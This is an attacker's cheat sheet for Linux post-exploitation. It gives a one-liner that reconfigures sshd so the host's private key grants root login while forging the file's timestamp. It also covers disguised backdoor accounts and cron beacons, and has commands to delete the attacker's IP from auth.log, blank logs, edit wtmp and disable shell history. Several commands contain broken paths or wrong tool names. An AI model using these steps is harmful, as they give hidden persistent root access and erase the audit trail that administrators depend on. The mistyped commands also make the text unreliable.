if stealth is needed only edit files in `/dev/shm` as this is in memory and no logs will be created
# Persistence
## SSH Keys
* Logs will be left in `/var/log/auth.log` and wherever they are forwarded. 
* Also requires a SSH serer on
### Add SSH key without editing timestamp
**Requires root**
1. Copies timestamp of `sshd-config` to `/dev/shm/.f`
2. Adds the root ssh key to the Auth Keys file. 
3. Restarts ssh daemon
4. Reverts the timestamp
5. Removes `/dev/shm/.f`
6. Cats the root ssh key to copy 

Copy the timestamp of the ssh_configs timestamp 
```shell
touch -r /etc/ssh/sshd_config /dev/shm/.f; sed -i -e '/^#AuthorizedKeysFile/ s/^#//' -e '/^AuthorizedKeysFile/ s/$/ \/etc\/ssh\/sshd_config/' /etc/ssh/sshd_config; systemctl reload sshd; touch -r /dev/shm/.f /etc/ssh/sshd_config; rm /dev/shm.f; cat /etc/ssh/ssh_host_rsa_key
```
Copy the ssh key to local machine
```shell
chmod 600 <file>
```
```shell
ssh -i key root@<IP>
```
## Account Creation
* Make a entirely new user account. 
* Done with the `useradd` command and add to sudo group with `usermod` then use the `passwd` command. 
* Leaves clear logs on `/etc/passwd` and `/etc/shadow`
* Make an account that blends in as a service or a genuine user. 
## Cron Jobs
* Schedule malicious code to run periodically
* New connection established if lost after a certain amount of time
* Highly sophisticated beacons/ implants can obfuscate by connecting at random intervals
* These are very obvious and as such code should be place in application scheduled for tasks. 

# Logs
### Removing our IP from access logs:
```
sed -i "/<ip>/d" /var/log/auth.log`
```
Logs are stored in `/var/logs`
### Most common logs
```
/var/log/messages
/var/log/syslogs
/var/log/auth.log
/var/log/secure
/var/log/kern
/var/log/cron
/var/log/apache2/
/var/log/mysql/
```

### Clearing up 
```shell
touch -a <YYYYMMDDHHMM> file
```
```shell
touch -m <YYYYMMDDHHMM> file
```
```shell
touch -r <file1> <file2>
```
```shell
nano /var/log/systemd
```
```shell
echo "" >  /var/log.auth.log
```
Clear UTMP/WTMP Files
```shell
utmpdump /var/log/wtmp > /tmp/wtmp.log
```
Remove offending logs
```shell
nano /tmpwtmp.log
```
Replace binary log without file
```shell
utmp -r </tmp/wtmp.log > var/log/wtmp
```
### Initial Actions
Disable .bash_history
```shell
unset HISTFILE
```
#### Transfer files to 
```
/tmp/
/dev/shm
```
